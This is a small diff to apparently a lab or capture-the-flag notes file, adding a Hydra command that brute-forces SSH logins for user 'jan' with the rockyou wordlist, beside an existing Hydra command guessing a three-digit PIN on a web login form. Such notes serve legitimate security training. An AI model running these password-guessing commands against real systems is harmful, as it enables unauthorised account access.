@@ -27,6 +27,14 @@ cewl http://MACHINE_IP -w output.txt
 
 ## Attacking with Hydra
 
+### Simple example
+
+```shell
+hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.10.150.40
+```
+
+### Advanced example
+
 ```shell
 hydra -l '' -P 3digits.txt -f -v MACHINE_IP http-post-form "/login.php:pin=^PASS^:Access denied" -s 8000
 ```
